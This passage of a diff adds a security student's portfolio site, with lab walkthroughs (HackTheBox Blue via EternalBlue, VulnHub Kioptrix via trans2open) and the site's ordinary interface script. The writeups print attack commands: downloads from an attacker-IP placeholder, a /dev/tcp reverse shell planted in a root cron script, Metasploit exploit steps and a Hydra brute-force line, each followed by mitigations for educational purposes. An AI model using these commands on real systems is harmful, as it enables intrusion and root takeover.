+wget http://&lt;attacker-ip&gt;:8080/linpeas.sh
+chmod +x linpeas.sh &amp;&amp; ./linpeas.sh</pre>
+          <p>linpeas surfaced a user <code>grimmie</code> with plaintext credentials in a configuration file. SSH'd in directly — the credentials worked.</p>
+
+          <h2>Root — cron job hijack</h2>
+          <p>In grimmie's home directory: a file called <code>backup.sh</code>. Routine backup script. The question was whether it ran on a schedule and under what user context. It was not visible in <code>ps aux</code>, so pspy was needed to catch it live.</p>
+          <pre># Serve pspy from the attack box:
+wget http://&lt;attacker-ip&gt;:8080/pspy64
+chmod +x pspy64 &amp;&amp; ./pspy64</pre>
+          <p>pspy confirmed it: <code>backup.sh</code> executing as root on a cron interval. The file was writable by grimmie. That is the vulnerability — a root cron job executing a user-writable script.</p>
+          <pre># Overwrite backup.sh with a reverse shell:
+echo 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/8080 0&gt;&amp;1' &gt; backup.sh
+
+# Listener on attack box:
+nc -lvnp 8080</pre>
+          <p>On the next cron execution: root shell.</p>
+
+          <h3>Detection &amp; mitigation</h3>
+          <ul>
+            <li>Disable anonymous FTP or audit what it exposes — credentials in an anonymous-readable directory is not a misconfiguration, it is an open door</li>
+            <li>Validate file uploads server-side on content and execution context, not just MIME type</li>
+            <li>Audit cron jobs running as root — especially scripts outside <code>/etc/</code> owned by non-root users</li>
+            <li>Run linpeas against your own systems periodically; what it finds is what the attacker finds</li>
+          </ul>
+        </div>
+      </div></article>
+      <article class="wu-article" id="article-blue"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>Feb 2026</span><span>HackTheBox</span></div>
+        <h1 class="wu-article-title">Blue — EternalBlue and Why You Should Run It by Hand</h1>
+        <div class="wu-body">
+          <h2>The machine</h2>
+          <p>Blue is the canonical EternalBlue machine on HackTheBox. It exists to teach ms17-010. Most people run it through Metasploit in under five minutes and move on. The value is not in the root shell — it is in understanding what the exploit is actually doing before you automate it into a single command.</p>
+
+          <h3>Enumeration</h3>
+          <pre>nmap -sV -sC -p- -oN nmap_blue &lt;target&gt;
+# Open: 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds)
+# OS: Windows 7 Professional SP1</pre>
+          <p>Two things immediately visible: SMB on port 445, and Windows 7 SP1. That combination has one obvious implication. The nmap vuln scripts confirmed it — ms17-010, EternalBlue.</p>
+
+          <h2>The vulnerability</h2>
+          <p>EternalBlue exploits a buffer overflow in the Windows SMBv1 implementation. The exploit sends a malformed <code>TRANSACTION2</code> request, overflows a pool buffer, and achieves kernel-level code execution. It was developed by the NSA, leaked by Shadow Brokers in 2017, and used in both WannaCry and NotPetya within weeks of the leak.</p>
+          <p><strong>The patch (MS17-010) was available before the leak. Every machine that fell to WannaCry was running unpatched software against a known vulnerability.</strong></p>
+
+          <h2>Exploitation</h2>
+          <pre>msfconsole
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS &lt;target&gt;
+set LHOST &lt;attacker-ip&gt;
+run</pre>
+          <p>The exploit targets port 445 directly. On success, a meterpreter session opens. The shell returns as <code>NT AUTHORITY\SYSTEM</code> — kernel execution means landing at the highest Windows privilege level. There is no escalation phase because there is no lower privilege to escalate from.</p>
+          <pre>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</pre>
+
+          <h2>What this actually demonstrates</h2>
+          <p>Blue is not a complex machine. Its purpose is to make a point: an unpatched SMB service on a network-accessible machine belongs to whoever finds it first. The exploit is stable, reliable, and in every major framework. The follow-up exercise that matters is running Wireshark while the exploit fires — watch the malformed TRANSACTION2 packets, watch the shell pop, understand it at the wire level rather than trusting a module to do the thinking for you.</p>
+
+          <h3>Detection &amp; mitigation</h3>
+          <ul>
+            <li>Disable SMBv1 entirely — it has no legitimate use case on modern networks</li>
+            <li>Apply MS17-010; if a system cannot be patched, it should not be network-accessible</li>
+            <li>Monitor for anomalous SMB traffic: large malformed TRANSACTION2 requests are EternalBlue's fingerprint on the wire</li>
+            <li>Network segmentation limits blast radius — an exploited workstation should not have unfiltered SMB access to the rest of the domain</li>
+          </ul>
+        </div>
+      </div></article>
+      <article class="wu-article" id="article-kioptrix"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>Jan 2026</span><span>VulnHub</span></div>
+        <h1 class="wu-article-title">Kioptrix — SMB Enumeration to Root via trans2open</h1>
+        <div class="wu-body">
+          <h2>The machine</h2>
+          <p>Kioptrix Level 1 is a foundational VulnHub machine — the kind that teaches the recon-to-exploit loop without letting you skip steps. The attack surface is narrow: an Apache web server, SSH, and an ancient Samba installation. The vulnerability is real, the exploit is in searchsploit, and what it teaches is how to identify which surface to hit and why.</p>
+
+          <h3>Enumeration</h3>
+          <pre>nmap -sS -T4 -p- -A &lt;target&gt;
+# -sS: SYN stealth scan — sends RST instead of completing the handshake
+# Open: 22 (SSH), 80 (HTTP), 139 (Samba), 443 (HTTPS)</pre>
+          <p>SYN scanning completes the first two steps of the TCP handshake then sends a RST — port state confirmed without a full connection. Quieter than a full connect scan, the right habit for recon.</p>
+          <pre>nikto -h http://&lt;target&gt;
+# Flags: Apache version, mod_ssl version, known CVEs for each</pre>
+          <p>Nikto flagged outdated Apache and mod_ssl versions. The Samba version was the more interesting finding — 2.2.1a, which maps directly to a known remote code execution vulnerability.</p>
+
+          <h2>Vulnerability identification</h2>
+          <pre>searchsploit samba 2.2
+# trans2open — remote buffer overflow, Samba &lt; 2.2.8 (CVE-2003-0201)</pre>
+          <p>trans2open is a buffer overflow in Samba's handling of <code>TRANSACTION2</code> requests. Any Samba below 2.2.8 is vulnerable. Kioptrix runs 2.2.1a — exploitable without modification.</p>
+
+          <h2>Exploitation via Metasploit</h2>
+          <pre>msfconsole
+search trans2open
+use exploit/linux/samba/trans2open
+set RHOSTS &lt;target&gt;
+set PAYLOAD linux/x86/shell_reverse_tcp
+run</pre>
+          <p>The default payload is the staged meterpreter shell (<code>linux/x86/meterpreter/reverse_tcp</code>). On Kioptrix it fails — the session opens and immediately dies. The fix is switching to the non-staged reverse shell.</p>
+          <p><strong>Staged vs non-staged:</strong> a staged payload sends a small stager that calls back to pull the full payload. Non-staged sends everything at once. On older or constrained targets, the staging callback fails and the session drops. When a session opens and immediately dies, non-staged is always the first thing to try.</p>
+          <pre>whoami
+# root</pre>
+
+          <h2>Alternative paths</h2>
+          <p><strong>OpenFuck</strong> targets the mod_ssl vulnerability Nikto flagged — a different surface, same outcome. The exploit requires the exact Apache and mod_ssl version string to select the right offset; Nikto provides both. <strong>Hydra SSH brute force</strong> is a third path if credential reuse is suspected:</p>
+          <pre>hydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt   ssh://&lt;target&gt;:22 -t 4 -V</pre>
+          <p>On a real engagement you map all attack surfaces before committing to one. Kioptrix is a single-machine lab so the first working path is enough — but the habit of not locking in too early pays off when the obvious surface is patched and the next one is not.</p>
+
+          <h3>Detection &amp; mitigation</h3>
+          <ul>
+            <li>Samba 2.2.x is over twenty years past end-of-life — update or isolate without exception</li>
+            <li>trans2open has a Metasploit module; if your Samba is old enough, exploitation requires no skill, just a version number</li>
+            <li>Monitor SMB traffic for malformed TRANSACTION2 requests — same family of fingerprints as EternalBlue</li>
+            <li>Nikto scans your web server the same way an attacker does; run it against your own stack before someone else does</li>
+          </ul>
+        </div>
+      </div></article>
+    </div>
+    <div class="page-nav" data-pagenav></div>
+  </div>
+</div>
+
+<!-- ════ SIDE QUESTS ════ -->
+<div class="page" id="page-sidequests">
+  <div class="wrap">
+    <div class="sec-head"><div class="sec-kicker">05 — <b>Side Quests</b></div><h2 class="sec-title">Off the clock.</h2></div>
+    <p class="sq-intro reveal">Not everything fits in a scope document. Some of it is just the shape of how I think.</p>
+    <div class="sq-grid">
+      <div class="sq-item reveal"><span class="sq-icon">◳</span><h4 class="sq-name">ASCII Engineering</h4><p class="sq-desc">Live camera feeds and video converters rendered as luminance-mapped ASCII in real time, zero perceptible lag. Started as "can I" and became "how precise can I make this".</p></div>
+      <div class="sq-item reveal"><span class="sq-icon">◇</span><h4 class="sq-name">Cybercore Design</h4><p class="sq-desc">UI and graphic work — minimal, high-contrast, sharp. Design is an attack surface: you either control how your message lands or you don't.</p></div>
+      <div class="sq-item reveal"><span class="sq-icon">◎</span><h4 class="sq-name">Public Speaking</h4><p class="sq-desc">Three terms as VP-Education at Rungta Toastmasters — curriculum design, anchoring hackathons and college festivals for 50+ members. If you can't explain the finding, you haven't finished the work.</p></div>
+      <div class="sq-item reveal"><span class="sq-icon">▢</span><h4 class="sq-name">Scrap Journaling</h4><p class="sq-desc">Physical documentation — fragments, cuts, prints, notes. A recording reflex that bleeds straight into how I document lab work and write reports.</p></div>
+      <div class="sq-item reveal"><span class="sq-icon">⟲</span><h4 class="sq-name">First-Principles Tinkering</h4><p class="sq-desc">Running exploits by hand instead of through one-line modules, packet capture open the whole time. If I can't see what it does on the wire, I don't really understand it yet.</p></div>
+      <div class="sq-item reveal"><span class="sq-icon">◷</span><h4 class="sq-name">The Permanent Lab</h4><p class="sq-desc">A living environment I never "finish" — I keep misconfiguring it, finding the misconfig through BloodHound, then writing the detection. The lab is the curriculum.</p></div>
+    </div>
+    <div class="page-nav" data-pagenav></div>
+  </div>
+</div>
+
+<!-- ════ CONTACT ════ -->
+<div class="page" id="page-contact">
+  <div class="wrap">
+    <div class="sec-head"><div class="sec-kicker">06 — <b>Contact</b></div></div>
+    <div class="ct-grid">
+      <div class="ct-l reveal">
+        <h2 class="ct-title">Let's talk about what your logs aren't telling you.</h2>
+        <p class="ct-note">Internships, detection-engineering and tooling work, or a real problem to solve. Serious enquiries get a reply within 48 hours.</p>
+        <a class="ct-link" href="mailto:gorkijaimnbidu18@gmail.com"><span>gorkijaimnbidu18@gmail.com</span><span>→</span></a>
+        <a class="ct-link" href="https://github.com/JAIMNBIDU" target="_blank" rel="noopener noreferrer"><span>github.com/JAIMNBIDU</span><span>→</span></a>
+        <a class="ct-link" href="https://www.linkedin.com/in/aryan-workofficial/" target="_blank" rel="noopener noreferrer"><span>linkedin — aryan-workofficial</span><span>→</span></a>
+      </div>
+      <div class="ct-r reveal">
+        <p>For sensitive assessments or NDA-first conversations, email is fine to start. All scope is treated as confidential by default.</p>
+        <div class="pgp"><p class="pgp-l">Preferred contact for sensitive work</p><p class="pgp-k">gorkijaimnbidu18@gmail.com<br>NDA available prior to any scoping call.</p></div>
+      </div>
+    </div>
+    <div class="page-nav" data-pagenav></div>
+  </div>
+  <footer><span class="ft">Aryan · honeybadger</span><span class="ft">Detection-first · builder who secures</span></footer>
+</div>
+
+<script>
+"use strict";
+(function(){
+  var d=document, body=document.body;
+  function el(id){return d.getElementById(id);}
+  var reduce=window.matchMedia&&window.matchMedia('(prefers-reduced-motion:reduce)').matches;
+  function touchDev(){return window.matchMedia&&window.matchMedia('(hover:none)').matches;}
+
+  /* ════════ REAL WEBGL DITHER (ported from React Bits) ════════ */
+  var COLORS={grayscale:[0.78,0.78,0.82],red:[0.86,0.16,0.10],purple:[0.58,0.32,0.92],blue:[0.27,0.50,0.94]};
+  var DEFAULTS={color:'grayscale',levels:4,amp:0.3,freq:3,speed:0.05,px:2,anim:true,mouse:true,mr:0.5};
+  var P={};for(var k in DEFAULTS)P[k]=DEFAULTS[k];
+
+  var canvas=el('dither');
+  var gl=null;
+  try{gl=canvas.getContext('webgl2',{antialias:false,alpha:false,depth:false,powerPreference:'low-power'});}catch(e){gl=null;}
+
+  var VERT='#version 300 es\nin vec2 position;void main(){gl_Position=vec4(position,0.0,1.0);}';
+  var FRAG='#version 300 es\n'+
+  'precision highp float;precision highp int;out vec4 fragColor;'+
+  'uniform vec2 uRes;uniform float uTime;uniform float uSpeed;uniform float uFreq;uniform float uAmp;'+
+  'uniform vec3 uColor;uniform vec2 uMouse;uniform float uMouseOn;uniform float uMouseRad;uniform float uColorNum;uniform float uPixel;'+
+  'vec4 mod289(vec4 x){return x-floor(x*(1.0/289.0))*289.0;}'+
+  'vec4 permute(vec4 x){return mod289(((x*34.0)+1.0)*x);}'+
+  'vec4 taylorInvSqrt(vec4 r){return 1.79284291400159-0.85373472095314*r;}'+
+  'vec2 fade(vec2 t){return t*t*t*(t*(t*6.0-15.0)+10.0);}'+
+  'float cnoise(vec2 P){vec4 Pi=floor(P.xyxy)+vec4(0.0,0.0,1.0,1.0);vec4 Pf=fract(P.xyxy)-vec4(0.0,0.0,1.0,1.0);Pi=mod289(Pi);'+
+  'vec4 ix=Pi.xzxz;vec4 iy=Pi.yyww;vec4 fx=Pf.xzxz;vec4 fy=Pf.yyww;vec4 i=permute(permute(ix)+iy);'+
+  'vec4 gx=fract(i*(1.0/41.0))*2.0-1.0;vec4 gy=abs(gx)-0.5;vec4 tx=floor(gx+0.5);gx=gx-tx;'+
+  'vec2 g00=vec2(gx.x,gy.x);vec2 g10=vec2(gx.y,gy.y);vec2 g01=vec2(gx.z,gy.z);vec2 g11=vec2(gx.w,gy.w);'+
+  'vec4 norm=taylorInvSqrt(vec4(dot(g00,g00),dot(g01,g01),dot(g10,g10),dot(g11,g11)));'+
+  'g00*=norm.x;g01*=norm.y;g10*=norm.z;g11*=norm.w;'+
+  'float n00=dot(g00,vec2(fx.x,fy.x));float n10=dot(g10,vec2(fx.y,fy.y));float n01=dot(g01,vec2(fx.z,fy.z));float n11=dot(g11,vec2(fx.w,fy.w));'+
+  'vec2 fade_xy=fade(Pf.xy);vec2 n_x=mix(vec2(n00,n01),vec2(n10,n11),fade_xy.x);return 2.3*mix(n_x.x,n_x.y,fade_xy.y);}'+
+  'float fbm(vec2 p){float value=0.0;float amp=1.0;float freq=uFreq;for(int i=0;i<4;i++){value+=amp*abs(cnoise(p));p*=freq;amp*=uAmp;}return value;}'+
+  'float pattern(vec2 p){vec2 p2=p-uTime*uSpeed;return fbm(p+fbm(p2));}'+
+  'const float bayer[64]=float[64](0.0,48.0,12.0,60.0,3.0,51.0,15.0,63.0,32.0,16.0,44.0,28.0,35.0,19.0,47.0,31.0,8.0,56.0,4.0,52.0,11.0,59.0,7.0,55.0,40.0,24.0,36.0,20.0,43.0,27.0,39.0,23.0,2.0,50.0,14.0,62.0,1.0,49.0,13.0,61.0,34.0,18.0,46.0,30.0,33.0,17.0,45.0,29.0,10.0,58.0,6.0,54.0,9.0,57.0,5.0,53.0,42.0,26.0,38.0,22.0,41.0,25.0,37.0,21.0);'+
+  'void main(){vec2 fc=floor(gl_FragCoord.xy/uPixel)*uPixel+uPixel*0.5;vec2 uv=fc/uRes;uv-=0.5;uv.x*=uRes.x/uRes.y;'+
+  'float f=pattern(uv);'+
+  'if(uMouseOn>0.5){vec2 m=(uMouse/uRes-0.5)*vec2(1.0,-1.0);m.x*=uRes.x/uRes.y;float dist=length(uv-m);float effect=1.0-smoothstep(0.0,uMouseRad,dist);f-=0.5*effect;}'+
+  'vec3 color=mix(vec3(0.0),uColor,f);'+
+  'vec2 sc=floor(gl_FragCoord.xy/uPixel);int bx=int(mod(sc.x,8.0));int by=int(mod(sc.y,8.0));'+
+  'float th=bayer[by*8+bx]/64.0-0.25;float stp=1.0/(uColorNum-1.0);color+=th*stp;color=clamp(color-0.2,0.0,1.0);'+
+  'color=floor(color*(uColorNum-1.0)+0.5)/(uColorNum-1.0);fragColor=vec4(color,1.0);}';
+
+  var prog,U={},renderScale=1,rafId=null,clock=0,lastT=0,inView=true,mx=0,my=0,glReady=false;
+
+  function compile(type,src){var s=gl.createShader(type);gl.shaderSource(s,src);gl.compileShader(s);
+    if(!gl.getShaderParameter(s,gl.COMPILE_STATUS)){console.warn('shader',gl.getShaderInfoLog(s));return null;}return s;}
+
+  function initGL(){
+    if(!gl)return false;
+    var vs=compile(gl.VERTEX_SHADER,VERT),fs=compile(gl.FRAGMENT_SHADER,FRAG);
+    if(!vs||!fs)return false;
+    prog=gl.createProgram();gl.attachShader(prog,vs);gl.attachShader(prog,fs);gl.linkProgram(prog);
+    if(!gl.getProgramParameter(prog,gl.LINK_STATUS)){console.warn('link',gl.getProgramInfoLog(prog));return false;}
+    gl.useProgram(prog);
+    var buf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,buf);
+    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,3,-1,-1,3]),gl.STATIC_DRAW);
+    var loc=gl.getAttribLocation(prog,'position');gl.enableVertexAttribArray(loc);gl.vertexAttribPointer(loc,2,gl.FLOAT,false,0,0);
+    ['uRes','uTime','uSpeed','uFreq','uAmp','uColor','uMouse','uMouseOn','uMouseRad','uColorNum','uPixel'].forEach(function(n){U[n]=gl.getUniformLocation(prog,n);});
+    glReady=true;return true;
+  }
+
+  function resize(){
+    if(!glReady)return;
+    var w=window.innerWidth,h=window.innerHeight;
+    var bw=Math.max(2,Math.round(w*renderScale)),bh=Math.max(2,Math.round(h*renderScale));
+    if(canvas.width!==bw||canvas.height!==bh){canvas.width=bw;canvas.height=bh;}
+    gl.viewport(0,0,bw,bh);
+    gl.uniform2f(U.uRes,bw,bh);
+  }
+
+  function drawFrame(){
+    gl.uniform1f(U.uTime,clock);
+    gl.uniform1f(U.uSpeed,P.speed);
+    gl.uniform1f(U.uFreq,P.freq);
+    gl.uniform1f(U.uAmp,P.amp);
+    var c=COLORS[P.color]||COLORS.grayscale;gl.uniform3f(U.uColor,c[0],c[1],c[2]);
+    gl.uniform2f(U.uMouse,mx*renderScale,my*renderScale);
+    gl.uniform1f(U.uMouseOn,P.mouse?1:0);
+    gl.uniform1f(U.uMouseRad,P.mr);
+    gl.uniform1f(U.uColorNum,P.levels);
+    gl.uniform1f(U.uPixel,Math.max(1,P.px*renderScale));
+    gl.drawArrays(gl.TRIANGLES,0,3);
+  }
+
+  var fpsWin=[];
+  function loop(now){
+    rafId=null;
+    if(!P.anim||!inView||d.hidden||!glReady)return;
+    var dt=now-(lastT||now);lastT=now;
+    clock+=dt/1000;
+    drawFrame();
+    fpsWin.push(dt);if(fpsWin.length>50)fpsWin.shift();
+    if(fpsWin.length===50){var avg=fpsWin.reduce(function(a,b){return a+b;},0)/50;
+      if(avg>34&&renderScale>0.5){renderScale=Math.max(0.5,renderScale-0.15);resize();fpsWin.length=0;}}
+    schedule();
+  }
+  function schedule(){if(rafId==null&&P.anim&&inView&&!d.hidden&&glReady)rafId=requestAnimationFrame(loop);}
+  function start(){lastT=0;schedule();}
+  function drawStatic(){if(glReady){resize();drawFrame();}}
+
+  if(gl&&initGL()){
+    var area0=window.innerWidth*window.innerHeight;
+    if(area0>2300000)renderScale=0.65;else if(area0>1500000)renderScale=0.8;
+    resize();
+    if('IntersectionObserver' in window){
+      new IntersectionObserver(function(es){inView=es[0].isIntersecting||true;}).observe(canvas);
+    }
+    inView=true;
+    if(!touchDev()){
+      window.addEventListener('mousemove',function(e){mx=e.clientX;my=e.clientY;},{passive:true});
+    }
+    var rt;window.addEventListener('resize',function(){clearTimeout(rt);rt=setTimeout(function(){resize();if(!P.anim||reduce)drawStatic();},150);});
+    d.addEventListener('visibilitychange',function(){if(!d.hidden)start();});
+    canvas.addEventListener('webglcontextlost',function(ev){ev.preventDefault();glReady=false;},false);
+    if(reduce){P.anim=false;mx=window.innerWidth*0.5;my=window.innerHeight*0.4;drawStatic();}
+    else{start();}
+  }else{
+    canvas.classList.add('failed'); // CSS fallback gradient shows
+  }
+
+  /* ── CONTROLS ── */
+  function bindSlider(id,vid,key,fmt){var s=el(id),o=el(vid);if(!s)return;
+    s.addEventListener('input',function(){P[key]=parseFloat(s.value);if(o)o.textContent=fmt?fmt(P[key]):s.value;if(!P.anim||reduce)drawStatic();});}
+  bindSlider('c-levels','v-levels','levels');
+  bindSlider('c-amp','v-amp','amp',function(v){return v.toFixed(2);});
+  bindSlider('c-freq','v-freq','freq',function(v){return v.toFixed(1);});
+  bindSlider('c-speed','v-speed','speed',function(v){return v.toFixed(2);});
+  bindSlider('c-px','v-px','px');
+  bindSlider('c-mr','v-mr','mr',function(v){return v.toFixed(2);});
+  var tAnim=el('t-anim'),tMouse=el('t-mouse');
+  tAnim.addEventListener('click',function(){var dis=!tAnim.classList.contains('on');tAnim.classList.toggle('on');tAnim.setAttribute('aria-checked',String(dis));P.anim=!dis;if(P.anim)start();else drawStatic();});
+  tMouse.addEventListener('click',function(){tMouse.classList.toggle('on');var on=tMouse.classList.contains('on');tMouse.setAttribute('aria-checked',String(on));P.mouse=on;if(!P.anim||reduce)drawStatic();});
+  [tAnim,tMouse].forEach(function(t){t.addEventListener('keydown',function(e){if(e.key===' '||e.key==='Enter'){e.preventDefault();t.click();}});});
+  var swWrap=el('cz-color');
+  swWrap.addEventListener('click',function(e){var b=e.target.closest('.sw');if(!b)return;swWrap.querySelectorAll('.sw').forEach(function(s){s.classList.remove('active');});b.classList.add('active');P.color=b.getAttribute('data-c');if(!P.anim||reduce)drawStatic();});
+  el('cz-reset').addEventListener('click',function(){
+    for(var kk in DEFAULTS)P[kk]=DEFAULTS[kk];
+    el('c-levels').value=4;el('v-levels').textContent='4';
+    el('c-amp').value=0.3;el('v-amp').textContent='0.30';
+    el('c-freq').value=3;el('v-freq').textContent='3.0';
+    el('c-speed').value=0.05;el('v-speed').textContent='0.05';
+    el('c-px').value=2;el('v-px').textContent='2';
+    el('c-mr').value=0.5;el('v-mr').textContent='0.50';
+    tAnim.classList.remove('on');tAnim.setAttribute('aria-checked','false');
+    tMouse.classList.add('on');tMouse.setAttribute('aria-checked','true');
+    swWrap.querySelectorAll('.sw').forEach(function(s){s.classList.toggle('active',s.getAttribute('data-c')==='grayscale');});
+    if(P.anim&&!reduce)start();else drawStatic();
+  });
+
+  /* ── MOBILE NAV ── */
+  var navToggle=el('nav-toggle'),navLinks=el('nav-links');
+  navToggle.addEventListener('click',function(){navLinks.classList.toggle('open');});
+
+  /* ── ROUTER ── */
+  var PAGES=['home','about','skills','projects','writeups','sidequests','contact'];
+  var LABELS={home:'Home',about:'About',skills:'Arsenal',projects:'Work',writeups:'Writeups',sidequests:'Side Quests',contact:'Contact'};
+  var overlay=el('page-overlay'),current='home';
+  d.querySelectorAll('[data-pagenav]').forEach(function(navEl){
+    var pageId=navEl.closest('.page').id.replace('page-','');var i=PAGES.indexOf(pageId);
+    var prev=i>0?PAGES[i-1]:null,next=i<PAGES.length-1?PAGES[i+1]:null;
+    var b1=d.createElement('button');b1.className='pgbtn'+(prev?'':' hidden');
+    if(prev){b1.setAttribute('data-page',prev);var s1=d.createElement('span');s1.textContent='← Previous';var t1=d.createElement('b');t1.textContent=LABELS[prev];b1.appendChild(s1);b1.appendChild(t1);}
+    var b2=d.createElement('button');b2.className='pgbtn next'+(next?'':' hidden');
+    if(next){b2.setAttribute('data-page',next);var s2=d.createElement('span');s2.textContent='Next →';var t2=d.createElement('b');t2.textContent=LABELS[next];b2.appendChild(s2);b2.appendChild(t2);}
+    navEl.appendChild(b1);navEl.appendChild(b2);
+  });
+  function swap(id){
+    var pages=d.querySelectorAll('.page');for(var i=0;i<pages.length;i++)pages[i].classList.remove('active');
+    var links=d.querySelectorAll('.nav-links a');for(var j=0;j<links.length;j++)links[j].classList.toggle('active',links[j].getAttribute('data-page')===id);
+    el('wu-list').style.display='';el('wu-detail').classList.remove('active');
+    var target=el('page-'+id);if(target){target.classList.add('active');triggerReveals(target);}
+    window.scrollTo(0,0);current=id;
+  }
+  function navigate(id,push){if(PAGES.indexOf(id)===-1||id===current){navLinks.classList.remove('open');return;}
+    navLinks.classList.remove('open');
+    if(push&&window.history&&history.pushState)history.pushState({page:id},'','#'+id);
+    overlay.classList.add('show');setTimeout(function(){swap(id);overlay.classList.remove('show');},260);}
+  window.addEventListener('popstate',function(e){var id=(e.state&&e.state.page)||(location.hash||'').replace('#','')||'home';
+    if(PAGES.indexOf(id)===-1)id='home';if(id===current)return;
+    overlay.classList.add('show');setTimeout(function(){swap(id);overlay.classList.remove('show');},260);});
+
+  /* ── WRITEUPS ── */
+  var WU=['classroomenv','threatlens','academy','blue','kioptrix','vulnhub-lab','smb-relay','mr-robot'];
+  function openWriteup(id){if(WU.indexOf(id)===-1)return;var arts=d.querySelectorAll('.wu-article');
+    for(var i=0;i<arts.length;i++)arts[i].classList.remove('show');var a=el('article-'+id);if(!a)return;
+    a.classList.add('show');el('wu-list').style.display='none';el('wu-detail').classList.add('active');window.scrollTo(0,0);}
+  el('wu-back-btn').addEventListener('click',function(){el('wu-detail').classList.remove('active');el('wu-list').style.display='';window.scrollTo(0,0);});
+
+  d.addEventListener('click',function(e){
+    var pg=e.target.closest('[data-page]');if(pg){e.preventDefault();navigate(pg.getAttribute('data-page'),true);return;}
+    var wu=e.target.closest('[data-wu]');if(wu){e.preventDefault();openWriteup(wu.getAttribute('data-wu'));}
+  });
+
+  function triggerReveals(container){var els=container.querySelectorAll('.reveal');
+    if(!('IntersectionObserver' in window)){els.forEach(function(x){x.classList.add('vis');});return;}
+    var obs=new IntersectionObserver(function(entries){entries.forEach(function(en){if(en.isIntersecting){en.target.classList.add('vis');obs.unobserve(en.target);}});},{threshold:.08});
+    els.forEach(function(x,i){x.style.transitionDelay=(i*.06)+'s';obs.observe(x);});}
+
+  var slider=el('risk-slider');
+  if(slider){function upd(){var days=parseInt(slider.value,10)||0;var s=100*Math.pow(0.5,days/30);el('risk-days').textContent=days;el('risk-num').textContent=Math.round(s);el('risk-fill').style.width=s+'%';}slider.addEventListener('input',upd);upd();}
+
+  /* ── TERMINAL ── */
+  var tbody=el('term-body'),tinput=el('term-input'),histArr=[],histPos=-1;
+  function print(text,cls){var line=d.createElement('div');line.className='term-line'+(cls?' '+cls:'');line.textContent=text;tbody.appendChild(line);tbody.scrollTop=tbody.scrollHeight;}
+  var CMDS={
+    help:function(){print('available commands:','accent');print('  whoami    who is honeybadger');print('  projects  jump to the work');print('  arsenal   skills & tools');print('  writeups  attack walkthroughs');print('  contact   how to reach me');print('  ls        list sections');print('  resume    one-line summary');print('  clear     wipe the screen');},
+    whoami:function(){print('aryan a.k.a. honeybadger — detection engineer & security tooling.');print('builder who secures. attack the lab, write the detection, automate the build.');},
+    ls:function(){print('about  arsenal  work  writeups  side-quests  contact');},
+    resume:function(){print('3rd-yr B.Tech CS (cybersec). ThreatLens + ClassroomEnv + Wazuh detection lab. Pursuing PNPT.');},
+    projects:function(){print('opening work…','accent');navigate('projects',true);},
+    work:function(){print('opening work…','accent');navigate('projects',true);},
+    arsenal:function(){print('opening arsenal…','accent');navigate('skills',true);},
+    skills:function(){print('opening arsenal…','accent');navigate('skills',true);},
+    writeups:function(){print('opening writeups…','accent');navigate('writeups',true);},
+    about:function(){print('opening about…','accent');navigate('about',true);},
+    contact:function(){print('opening contact…','accent');navigate('contact',true);},
+    clear:function(){tbody.textContent='';},
+    sudo:function(){print('nice try. this badger does not yield root.','accent');}
+  };
+  function runCmd(raw){var cmd=raw.trim().toLowerCase();print(raw,'cmd');if(!cmd)return;histArr.push(raw);histPos=histArr.length;var fn=CMDS[cmd.split(' ')[0]];if(fn)fn();else print("command not found: "+cmd+"  (try 'help')");}
+  if(tbody&&tinput){print('honeybadger // portfolio shell  —  type help','accent');print('');
+    tinput.addEventListener('keydown',function(e){
+      if(e.key==='Enter'){runCmd(tinput.value);tinput.value='';}
+      else if(e.key==='ArrowUp'){if(histPos>0){histPos--;tinput.value=histArr[histPos]||'';}}
+      else if(e.key==='ArrowDown'){if(histPos<histArr.length-1){histPos++;tinput.value=histArr[histPos]||'';}else{histPos=histArr.length;tinput.value='';}}
+    });
+    var term=tinput.closest('.terminal');if(term)term.addEventListener('click',function(){tinput.focus();});}
+
+  /* ── INIT ROUTE ── */
+  var initId=(location.hash||'').replace('#','');if(PAGES.indexOf(initId)===-1)initId='home';
+  if(window.history&&history.replaceState)history.replaceState({page:initId},'','#'+initId);
+  swap(initId);
+})();
+</script>
+</body>
+</html>
